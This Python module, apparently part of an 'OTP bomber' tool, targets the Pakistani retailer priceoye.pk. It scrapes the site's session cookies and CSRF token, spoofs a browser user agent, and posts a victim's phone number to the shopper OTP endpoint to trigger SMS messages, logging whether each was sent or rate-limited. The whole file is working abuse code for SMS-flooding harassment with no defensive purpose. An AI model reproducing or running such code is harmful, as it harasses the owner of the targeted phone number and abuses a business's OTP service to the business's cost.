from otpbomber.core import *
from otpbomber.localuseragent import *

async def priceoye(phone, client, out):
    name = "priceoye"
    domain = "priceoye"
    frequent_rate_limit=False

    random_srsltid = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=37))
    random_srsltid=f'{random_srsltid}-KO7_brX774PEOe0nyz'
    params = {
        'srsltid': random_srsltid,
    }
    headers = {
        'User-Agent': random.choice(ua["browsers"]["chrome"])
    }

    response = await client.get('https://priceoye.pk/', params=params, headers=headers)
    XSRF_TOKEN = response.cookies['XSRF-TOKEN']
    po_session = response.cookies['po_session']
    csrf_token = re.search(r'<meta name="csrf-token" content="(.+?)">', response.text).group(1)
    cookies = {
        'XSRF-TOKEN': XSRF_TOKEN,
        'po_session': po_session
    }


    data = {
        'shopper_phone': f"+92{phone[-10:]}",
        '_token': csrf_token,
    }

    response = await client.post(
        'https://priceoye.pk/shoppers/generate_shopper_otp',
        cookies=cookies,
        headers=headers,
        data=data
    )
    try:
        data=response.json()
        if data["response"] == "OTP send successfully":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        else:
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None